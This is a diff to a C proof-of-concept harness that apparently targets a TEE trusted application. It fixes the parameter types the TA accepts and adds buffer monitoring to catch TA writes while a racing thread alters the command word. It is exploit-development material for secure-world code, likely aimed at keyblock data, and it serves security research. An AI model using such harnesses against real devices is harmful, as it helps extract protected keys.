@@ -5,6 +5,7 @@
 #include <string.h>
 #include "tee_client_api.h"
 #include "repro.h"
+#include "zerocopy.h"
 #include <dlfcn.h>
 
 TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
@@ -45,7 +46,10 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
 
 	TEEC_Operation op;
     memset(&op, 0, sizeof(op));
-    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INOUT, TEEC_MEMREF_TEMP_INOUT,
+    /* The types the TA expects: param0 carries the sub-command word this PoC
+     * races, param1 receives its output (beanpod/harness/df1e_fuzz uses
+     * ptypes 0x65). INOUT/INOUT is rejected with TEEC_ERROR_BAD_PARAMETERS. */
+    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT, TEEC_MEMREF_TEMP_OUTPUT,
                                      TEEC_NONE, TEEC_NONE);
     printf("params: 0x%lx\n", op.paramTypes);
     op.params[0].tmpref.buffer = mem_area1;  // the keyblock buffer
@@ -60,7 +64,11 @@ void send_req(TEEC_Context *context, TEEC_Session *session)
         return;
     } 
 
+    /* Watch the output buffer: the racing thread only writes param0, so a
+     * change here during the call was written by the TA. */
+    zc_start(mem_area2, 0, 64);
     TEEC_Result res = TEEC_InvokeCommand_impl(session, 0x1, &op, &err_origin);
+    zc_stop();
 	printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
 }
 
